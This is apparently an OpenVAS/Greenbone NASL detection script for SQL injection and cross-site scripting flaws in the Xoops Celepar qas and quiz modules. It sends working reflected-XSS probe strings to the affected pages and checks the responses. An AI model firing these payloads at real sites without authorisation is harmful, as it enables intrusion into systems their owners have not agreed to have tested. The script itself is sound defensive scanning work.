if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.801153" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2010-03-23 15:59:14 +0100 (Tue, 23 Mar 2010)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_bugtraq_id( 35820 );
	script_cve_id( "CVE-2009-4698", "CVE-2009-4713", "CVE-2009-4714" );
	script_name( "Xoops Celepar Multiple Vulnerabilities" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/35966" );
	script_xref( name: "URL", value: "http://www.milw0rm.com/exploits/9249" );
	script_xref( name: "URL", value: "http://www.milw0rm.com/exploits/9261" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/51985" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_xoops_celepar_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "xoops_celepar/detected" );
	script_tag( name: "insight", value: "- The flaw exists in 'Qas (aka Quas) module'. Input passed to the 'codigo'
  parameter in modules/qas/aviso.php and modules/qas/imprimir.php, and the
  'cod_categoria' parameter in modules/qas/categoria.php is not properly
  sanitised before being used in an SQL query.

  - The flaw exists in 'Qas (aka Quas) module' and 'quiz'module. Input passed
  to the 'opcao' parameter to modules/qas/index.php, and via the URL to
  modules/qas/categoria.php, modules/qas/index.php, and
  modules/quiz/cadastro_usuario.php is not properly sanitised before being
  returned to the user." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Xoops Celepar and is prone to multiple
  vulnerabilities." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to execute
  arbitrary SQL statements on the vulnerable system, which may allow an attacker
  to view, add, modify data, or delete information in the back-end database and
  also conduct cross-site scripting." );
	script_tag( name: "affected", value: "Xoops Celepar module 2.2.4 and prior" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
xoopsPort = http_get_port( default: 80 );
celeparVer = get_kb_item( "www/" + xoopsPort + "/XoopsCelepar" );
if(!celeparVer){
	exit( 0 );
}
celeparVer = eregmatch( pattern: "^(.+) under (/.*)$", string: celeparVer );
sndReq = http_get( item: NASLString( celeparVer[2], "/modules/qas/index.php" ), port: xoopsPort );
rcvRes = http_send_recv( port: xoopsPort, data: sndReq );
if(IsMatchRegexp( rcvRes, "^HTTP/1\\.[01] 200" ) && ContainsString( rcvRes, "_MI_QAS_POR" )){
	url = NASLString( celeparVer[2], "/modules/qas/categoria.php?cod_categoria='><script>alert('VT-XSS-Exploit');</script>" );
	sndReq = http_get( item: url, port: xoopsPort );
	rcvRes = http_send_recv( port: xoopsPort, data: sndReq );
	if(IsMatchRegexp( rcvRes, "^HTTP/1\\.[01] 200" ) && ContainsString( rcvRes, "VT-XSS-Exploit" )){
		report = http_report_vuln_url( port: xoopsPort, url: url );
		security_message( port: xoopsPort, data: report );
		exit( 0 );
	}
}
sndReq = http_get( item: NASLString( celeparVer[2], "/modules/quiz/login.php" ), port: xoopsPort );
rcvRes = http_send_recv( port: xoopsPort, data: sndReq );
if(IsMatchRegexp( rcvRes, "^HTTP/1\\.[01] 200" ) && ContainsString( rcvRes, "Quiz:" )){
	url = NASLString( celeparVer[2], "/module/quiz/cadastro_usuario.php/>'><ScRiPt>alert('VT-XSS-Exploit');</ScRiPt>" );
	sndReq = http_get( item: url, port: xoopsPort );
	rcvRes = http_send_recv( port: xoopsPort, data: sndReq );
	if(IsMatchRegexp( rcvRes, "^HTTP/1\\.[01] 200" ) && ContainsString( rcvRes, "VT-XSS-Exploit" )){
		report = http_report_vuln_url( port: xoopsPort, url: url );
		security_message( port: xoopsPort, data: report );
		exit( 0 );
	}
}

